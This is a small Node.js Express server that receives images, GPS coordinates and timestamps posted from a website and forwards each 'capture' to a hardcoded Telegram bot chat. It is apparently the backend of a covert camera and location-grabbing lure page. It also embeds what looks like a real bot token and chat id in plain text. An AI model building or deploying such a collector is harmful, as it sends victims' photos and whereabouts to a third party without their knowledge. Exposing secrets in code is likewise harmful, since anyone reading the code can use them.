import express from "express";
import cors from "cors";
import fetch from "node-fetch";

const app = express();
app.use(cors());
app.use(express.json({ limit: "10mb" }));

// 🔹 তোমার Telegram bot token আর chat id দাও নিচে
const BOT_TOKEN = "8446724417:AAHrcpx_AK2zYya2zW3GrtN5n9tzEQFp6F0";
const CHAT_ID = "7645002198";

// 🔹 Receive data from website and forward to Telegram
app.post("/", async (req, res) => {
  try {
    const { image, latitude, longitude, timestamp } = req.body;

    let caption = `📍 New capture received!\n🕒 ${timestamp}`;
    if (latitude !== "unknown") caption += `\n🌐 Location: ${latitude}, ${longitude}`;

    // Send photo to Telegram
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        photo: image,
        caption: caption
      }),
    });

    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, error: err.message });
  }
});

app.listen(3000, () => console.log("✅ Server running on port 3000"));
